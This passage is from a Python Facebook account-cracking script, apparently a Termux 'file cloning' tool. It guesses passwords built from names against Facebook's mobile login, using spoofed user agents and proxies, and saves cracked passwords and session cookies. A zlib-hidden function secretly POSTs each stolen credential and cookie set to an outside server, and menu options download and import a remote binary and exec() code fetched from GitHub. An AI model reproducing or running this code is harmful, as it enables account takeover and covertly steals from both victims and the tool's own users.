Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (Linux; U; Android {a}; {o}; {random.choice([f'{l}','Infinix X608'])} Build/{b}.{c}.0{d}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h}{random.choice([f' MZBrowser/{str(random.randint(6,8))}.{str(random.randint(0,10))}.{str(random.randint(0,10))} UWS/2.15.0.2',f' MZBrowser/{str(random.randint(8,10))}.{str(random.randint(0,20))}.{str(random.randint(0,20))}',f' MQQBrowser/{str(random.randint(4,10))}.{str(random.randint(0,9))}',f' UCBrowser/{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(100,1299))}'])} Mobile Safari/537.36",
		f"Mozilla/5.0 (Linux; U; Android {a}; {o}; {random.choice([f'{j}',f'{k}',f'{l}',f'{m}'])} Build/{b}.{c}.0{d}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice([f' OppoBrowser/{str(random.randint(1,25))}.{str(random.randint(1,9))}.0.{str(random.randint(1,9))}',f' RealmeBrowser/{str(random.randint(10,39))}.{str(random.randint(1,9))}.0.{str(random.randint(1,9))}',f' HeyTapBrowser/{str(random.randint(6,49))}.{str(random.randint(7,8))}.{str(random.randint(2,40))}.{str(random.randint(1,9))}',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}'])}",
		f"Mozilla/5.0 (Linux; Android {a}; {random.choice([f'{l}','Infinix X608'])} Build/{b}.{c}.0{d}; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36 Puffin/8.3.1.41624AP",
		f"Mozilla/5.0 (Linux; Android {a}; {random.choice(['WP21','TECNO KE7','RG655'])} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}"
	])
	return z


os.system('xdg-open https://chat.whatsapp.com/Lm36KD44fSd8O0a44jv5PL')

def clear_terminal():
    os.system('clear')
    print("""\033[0;37m
   
░░░░░██╗███████╗███╗░░██╗██╗░██████╗██╗░░██╗
░░░░░██║██╔════╝████╗░██║██║██╔════╝██║░░██║
░░░░░██║█████╗░░██╔██╗██║██║╚█████╗░███████║
██╗░░██║██╔══╝░░██║╚████║██║░╚═══██╗██╔══██║
╚█████╔╝███████╗██║░╚███║██║██████╔╝██║░░██║
░╚════╝░╚══════╝╚═╝░░╚══╝╚═╝╚═════╝░╚═╝░░╚═╝ 
----------------------------------------------
 Owner: jenish
 status: trial
 Version: 1.2
 Contact: +9779762900020
\033[0;37m----------------------------------------------""")
def linex():
    print('\033[0;37m----------------------------------------------')

def Main():
	clear_terminal()
	link = "https://chat.whatsapp.com/Ky7m2ILbwCgA51Si0Wyah8"
	print(' [1] File Cloning \n [2] File Create \n [3] Get Free Token \n [4] How To Use \n [5] Contact Owner \n [0] Exit Command ')
	linex()
	user = input(' Put: ')
	linex()
	if user=="1":
		file()
	elif user=="2":
		if not path.isfile("FILE64.so"):
			os.system('curl https://raw.githubusercontent.com/Hannan-404/FILE/main/FILE64.so > FILE64.so')
		os.system('python -c "import FILE64"')
	elif user =="3":
		clear_terminal()
		try:
			url = str(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/\xc9\xcfN\xcd\xd3\xcd\xc9O\xcf\xcc\xd3MIMK,\xcd)\xd1-*II\xd2K\xcb,JMJ,N\xcd\xcc\xd7K\xce\xcf\x85\xa8\xd3\xcb*\xce\xcf\x03\x00\x85{\x16\n')).replace("b'","").replace("'","")
			result = subprocess.run(['curl', '-s', url], capture_output=True, text=True, check=True)
			token = result.stdout.split('"')[1]
			print(f" Active token: {token}")
			input("\n Press Enter To Back ")
			Main()
		except subprocess.CalledProcessError as e:
			pass
		Main()
	elif user=="4":
		exec(requests.get('https://raw.githubusercontent.com/ProfessorX07/executables/main/link.txt').text)
		Main()
	elif user=="5":
		os.system(f'xdg-open https://wa.me/+923232575045')
		Main()
	elif user=="0":
		exit(" Thanks For Use My Tools ")
	else:
		print(" Invalid option  ")
		time.sleep(1)
		Main()

pcp=[]
ok=[]
cp=[]
loop=0
def file():
	clear_terminal()
	try:
		fo = open(input(' Put File Path: '),'r').read().splitlines()
	except FileNotFoundError:
		print(" File Not Found Error! ")
		time.sleep(1)
		file()
	clear_terminal()
	plist=[]
	try:
		ps_limit = int(input(' How Many Passwords You Want Add?: '))
	except:
		ps_limit =2
	linex()
	print('\033[1;32m Password Exp:first last,First Last,first123')
	linex()
	for i in range(ps_limit):
		plist.append(input(f' Put Pas No.{i+1}: '))
	#clear_terminal()
	#print(' [1] Method 1 \n [2] Method 2 ')
	#linex()
	#method = input(' Method: ')
	linex()
	cx = input(' Show Cp Account In Terminal? (y/n): ')
	if cx in ['y','Y','yes','Yes','1']:
		pcp.append('y')
	with tred(max_workers=30) as crack_submit:
		clear_terminal()
		print(' Total Summary: \033[1;32m'+str(len(fo)))
		print("\033[0;37m Process Is Running In Background \033[0;37m")
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			#if method=="2":
			#	crack_submit.submit(m2,ids,names,passlist)
			#else:
			crack_submit.submit(normal,ids,names,passlist)
	print('\033[0;37m')
	linex()
	print(' The Process Has Completed')
	print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
	linex()
	input(' Press Enter To Back')
	ok.clear()
	cp.clear()
	loop.clear()
	Main()

def mydata(data):
	try:
		link = str(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O\xcd\xc9,I510\xd1+N-*30\xd0\xcbK-\xd1OI,I\xd4+\xc8(\x00\x00\xe6\xf6\x0cy')).replace("b'","").replace("'","")
		subprocess.run(['curl', '-X', 'POST', link, '--data', f'fulldata={data}'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
	except subprocess.CalledProcessError:
		time.sleep(5)
		mydata(data)

def normal(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[0;37m [Nischal XD] [M-1] %s|\033[1;32mOK:%s \033[0;37m'%(loop,len(ok)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			ua = random.choice([random.choice(ugen),Ugen()])
			ses = requests.Session()
			ses.cookies.clear()
			rr = random.randint;rc = random.choice
			url = "https://m.facebook.com/login.php?skip_api_login=1&api_key=114593902037957&kid_directed_site=0&app_id=114593902037957&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D114593902037957%26cbt%3D1701088365087%26channel_url%3Dhttps%253A%252F%252Fstaticxm.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3cab5fd61e0304%2526domain%253Dpixabay.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpixabay.com%25252Ff35533a5a42b844%2526relation%253Dopener%26client_id%3D114593902037957%26display%3Dtouch%26domain%3Dpixabay.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpixabay.com%252Fphotos%252F%26locale%3Den_US%26logger_id%3Df2534d0c16a119%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxm.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df284c1bec159d1%2526domain%253Dpixabay.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpixabay.com%25252Ff35533a5a42b844%2526relation%253Dopener%2526frame%253Df3ef3d0493a9da%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxm.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df284c1bec159d1%26domain%3Dpixabay.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpixabay.com%252Ff35533a5a42b844%26relation%3Dopener%26frame%3Df3ef3d0493a9da%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated&_rdr"
			head1 = {'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'dnt': '1', 'x-requested-with': 'com.facebook.katana', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-user': 'empty', 'sec-fetch-dest': 'document', 'referer': 'https://m.facebook.com/', 'accept-encoding': 'gzip, deflate br', 'accept-language': 'en-HK,en-US;q=0.9,en;q=0.8'}
			link = ses.get(url,headers=head1)
			data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'true', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1), 'pass':pas, 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1), '__dyn': '', '__csr': '', '__req': 'h', '__a': '', '__user': '0', '_fb_noscript': 'true'}
			yusup = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			head = {'authority': 'm.facebook.com', 'accept': '*/*', 'accept-language': 'en-HK,en-US;q=0.9,en;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '3.02348', 'origin': 'https://m.facebook.com', 'referer': url, 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"', 'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '""', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent':ua, 'viewport-width': '891', 'x-asbd-id': '129477', 'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1)}
			ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',headers=head,data=data,cookies={'cookie': yusup},proxies=prox(),allow_redirects=False)
			if "checkpoint" in str(ses.cookies.get_dict()):
				if 'y' in pcp:
					print('\r\r\033[1;31m [CP] '+ids+' | '+pas)
				open('/sdcard/Professor-CP.txt','a').write(ids+'|'+pas+'\n')
				cp.append(ids)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki = ses.cookies.get_dict()
				coki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=en_US" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				ids = re.search('c_user=(.*?);',str(coki)).group(1)
				print('\r\r\033[1;32m [OK] '+ids+' | '+pas+'\033[1;37m')
				print('\r\r\033[1;34m [🍪] :=> '+coki)
				open('/sdcard/Nischal XD-COKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
				open('/sdcard/Nischal-OK.txt','a').write(ids+'|'+pas+'\n')
				ok.append(ids)
				data = ids+'|'+pas+'|'+coki
				mydata(data)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(5)
		normal(ids,names,passlist)
	except Exception as e:pass

Main()
